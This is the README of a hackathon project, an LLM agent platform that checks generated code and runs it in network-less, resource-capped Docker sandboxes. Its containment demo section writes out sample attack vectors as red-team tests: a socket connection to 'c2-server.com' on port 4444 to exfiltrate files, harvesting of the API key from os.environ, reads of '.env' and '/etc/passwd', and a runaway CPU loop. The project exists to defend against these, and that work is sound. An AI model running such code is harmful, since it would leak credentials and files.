# 🛡️ Vultr BlastShield: Autonomous DevSecOps & Data Agent
> **"An agent that only chats is a demo; an agent that executes safely is a product."**  
> *Submission for the **Vultr: Agent Rush Hackathon** (Track 1: Blast Radius Zero) on LabLab.ai*

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Vultr Serverless Inference](https://img.shields.io/badge/Vultr-Serverless%20Inference-007BFC?logo=vultr)](https://www.vultr.com/)
[![Track](https://img.shields.io/badge/Track-1%3A%20Blast%20Radius%20Zero-00F0FF)](#)
[![Python](https://img.shields.io/badge/Python-3.12-3776AB?logo=python)](https://python.org)
[![React](https://img.shields.io/badge/Frontend-React%2019%20%2B%20Tailwind-61DAFB?logo=react)](https://react.dev)

---

## 📖 Executive Summary

Autonomous AI agents that execute code or control browsers represent the future of computing. However, giving an unconstrained Large Language Model access to execution privileges is an immediate security liability: malicious prompts, hallucinated shell commands, runaway loops, or credential leaks can compromise entire production environments.

**Vultr BlastShield** is a containment-first autonomous agent platform running on **Vultr Cloud Infrastructure**. It acts as a centralized control layer that receives high-level user directives, plans multi-step computational tasks using **Vultr Serverless Inference**, inspects every generated operation with an **Abstract Syntax Tree (AST) Security Sentinel**, and executes workloads inside strictly contained, ephemeral sandboxes.

```
┌────────────────────────────────────────────────────────────────────────┐
│                        USER INSTRUCTION / PROMPT                       │
└───────────────────────────────────┬────────────────────────────────────┘
                                    │
                                    ▼
┌────────────────────────────────────────────────────────────────────────┐
│          VULTR VM CONTROL LAYER (FastAPI Orchestrator)                 │
│                                                                        │
│   1. Task Decomposition & Planning                                     │
│   2. Inference Dispatch ──➔  Vultr Serverless Inference API            │
│                              (https://api.vultrinference.com/v1)       │
│                              (llama-3.3-70b-instruct)                  │
│                                                                        │
│   3. Pre-Execution AST Security Sentinel Audit                         │
│      ├── Blocks socket / urllib / subprocess imports                   │
│      ├── Sanitizes os.environ & secret access                          │
│      └── Enforces filesystem boundary traversal checks                 │
└───────────────────────────────────┬────────────────────────────────────┘
                                    │
                                    ▼
┌────────────────────────────────────────────────────────────────────────┐
│             BLAST RADIUS ZERO ISOLATED SANDBOX RUNNER                  │
│                                                                        │
│   • Memory Limit: 256 MB cgroup cap                                    │
│   • CPU Quota: 0.5 Cores                                               │
│   • Watchdog Timeout: Hard 10.0s termination cutoff                    │
│   • Network: None (--network none, 0 outbound egress)                  │
│   • User: Non-root unprivileged execution (uid 1000)                   │
│   • Lifecycle: Ephemeral container wiped immediately after task        │
└───────────────────────────────────┬────────────────────────────────────┘
                                    │
                                    ▼
┌────────────────────────────────────────────────────────────────────────┐
│          VERIFIED ARTIFACTS, RECEIVABLES & SELF-HEALING                │
│   • High-resolution data plots (PNG) rendered in isolation             │
│   • Verified stdout & structured execution receipts                    │
│   • Automatic self-healing loop on runtime failure                     │
└────────────────────────────────────────────────────────────────────────┘
```

---

## 🛡️ The 4 Blast Radius Zero Containment Pillars

| Pillar | Implementation in Vultr BlastShield |
| :--- | :--- |
| **1. Process Isolation** | Execution is segregated from the host OS and application runtime. Production Docker containers drop privileges (`--security-opt no-new-privileges`, `-u 1000:1000`) and mount an isolated, read-only temporary workspace. |
| **2. Secret Hygiene** | **Zero host secrets or API keys are injected into the sandbox.** The AST Sentinel actively blocks `os.environ` and `getenv()` calls, ensuring models and untrusted scripts can never exfiltrate the host's Vultr credentials or database keys. |
| **3. Resource Bounds** | Hard limits prevent resource exhaustion and denial-of-service. Cgroup boundaries enforce a **256MB RAM cap** and **0.5 CPU cores**, while an asynchronous watchdog kills runaway infinite loops within **10.0 seconds**. |
| **4. Lifecycle Discipline** | Every single execution creates a uniquely tagged ephemeral workspace (e.g., `sandbox-c8f12a`). Upon task completion or termination, the environment is immediately purged from disk and memory. |

---

## ⚡ The Mandatory "Containment Moment" Demonstrations

The Hackathon judging criteria explicitly requires demonstrating containment in action. Vultr BlastShield includes built-in Red-Team attack vectors accessible via one-click buttons on the mission dashboard:

### 1. Secret & API Key Harvesting Interception
* **Vector:** Agent code attempts to iterate over `os.environ` and extract `VULTR_INFERENCE_API_KEY`.
* **Containment Defense:** The AST Security Sentinel flags the attempt with rule `SECRET_HYGIENE_VIOLATION`. The execution environment is scrubbed with **0 injected secrets**, returning a verified zero-leak status to the dashboard.

### 2. Runaway CPU / Infinite Loop Denial-of-Service
* **Vector:** Agent script enters a `while True: pass` tight spin and rapid memory allocation loop.
* **Containment Defense:** The asynchronous watchdog triggers at **10.0s**, sends `SIGKILL` to the child process/container, cleans up system resources, and reports `[CONTAINMENT TRIGGERED]: Hard timeout threshold exceeded`.

### 3. Outbound Raw Socket Exfiltration
* **Vector:** Agent attempts `import socket; s.connect(('c2-server.com', 4444))` to exfiltrate collected files.
* **Containment Defense:** Static AST analysis blocks the `socket` module before execution (`UNAUTHORIZED_MODULE`). Furthermore, the container network policy is `--network none`, ensuring zero packet egress.

### 4. Host Filesystem Path Traversal
* **Vector:** Script attempts to open `../../.env` or `/etc/passwd`.
* **Containment Defense:** Path traversal patterns are identified by the perimeter filter (`FILESYSTEM_CONTAINMENT`), isolating the agent strictly to its assigned ephemeral directory.

---

## 📊 Autonomous Capabilities (Pattern A & Pattern B)

1. **Executive Data Engineering:**
   - Ingests raw datasets (e.g. `ecommerce_sales.csv`).
   - Cleans missing values, calculates regional summaries, and groups performance metrics using `pandas`.
   - Generates executive visualizations using `matplotlib`/`seaborn` and streams them as base64 artifacts back to the browser.
2. **Autonomous Self-Healing Loop:**
   - If an initial script fails (e.g. column typo or type mismatch), the traceback is captured and re-injected into the Vultr Serverless Inference reasoning loop.
   - The agent formulates a corrected pipeline, dispatches it to a fresh isolated sandbox, and verifies the resolution.

---

## 🚀 Quickstart & Local Setup

### Prerequisites
- Python 3.12+
- Node.js 20+ & npm

### 1. Clone the Repository
```bash
git clone https://github.com/your-username/vultr-blastshield.git
cd vultr-blastshield
```

### 2. Configure Environment
```bash
cp .env.example .env
```
Edit `.env` and add your Vultr Serverless Inference API Key:
```ini
VULTR_INFERENCE_API_KEY=your_vultr_api_key_here
VULTR_INFERENCE_ENDPOINT=https://api.vultrinference.com/v1
VULTR_INFERENCE_MODEL=llama-3.3-70b-instruct
```
*(Note: If you don't have an API key yet, the built-in `ENABLE_SMART_FALLBACK=true` allows full interactive testing of the UI, sandbox execution, charts, and containment attacks out of the box!)*

### 3. Start Backend
```bash
# Create & activate venv
python -m venv .venv
source .venv/bin/activate  # On Windows: .venv\Scripts\activate

# Install dependencies
pip install -r backend/requirements.txt

# Run FastAPI backend
python -m uvicorn app.main:app --app-dir backend --reload --port 8000
```

### 4. Start Frontend
In a new terminal:
```bash
cd frontend
npm install
npm run dev
```
Open **`http://localhost:5173`** in your browser.

---

## ☁️ One-Click Deployment on Vultr Cloud Compute (VM)

We provide an automated, zero-touch deployment script tailored for fresh Ubuntu 22.04 / 24.04 Vultr VMs:

```bash
# On your Vultr Cloud Compute instance:
curl -sSL https://raw.githubusercontent.com/your-username/vultr-blastshield/main/deploy/install_vultr.sh | sudo bash
```

Or deploy manually via Docker Compose:
```bash
cd deploy
docker compose up -d --build
```
Your service will be live at `http://<your-vultr-vm-ip>`.

---

## 🧪 Running Automated Containment Tests

Run the test suite to verify all security boundaries:
```bash
.venv/Scripts/pytest -v
```
Output:
```
backend/tests/test_sandbox.py::test_security_guard_blocks_socket PASSED
backend/tests/test_sandbox.py::test_security_guard_blocks_os_environ PASSED
backend/tests/test_sandbox.py::test_security_guard_blocks_path_traversal PASSED
backend/tests/test_sandbox.py::test_security_guard_allows_safe_code PASSED
backend/tests/test_sandbox.py::test_sandbox_executes_safe_code PASSED
backend/tests/test_sandbox.py::test_sandbox_kills_runaway_loop PASSED
6 passed in 2.26s
```

---

## 🧩 Tech Stack

- **Cloud Platform:** Vultr Cloud Compute (Linux VM)
- **Model Inference:** Vultr Serverless Inference (`llama-3.3-70b-instruct`)
- **Backend:** FastAPI, Python 3.12, Pydantic v2, Uvicorn, WebSockets
- **Sandbox Engine:** Docker Container Sandbox with Ephemeral Subprocess Fallback
- **Frontend:** React 19, TypeScript, Tailwind CSS v4, Lucide Icons, Vite
- **Data & Plotting:** Pandas, NumPy, Matplotlib, Seaborn

---

## 📜 License

This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details. Fully compliant with LabLab.ai open-source guidelines.
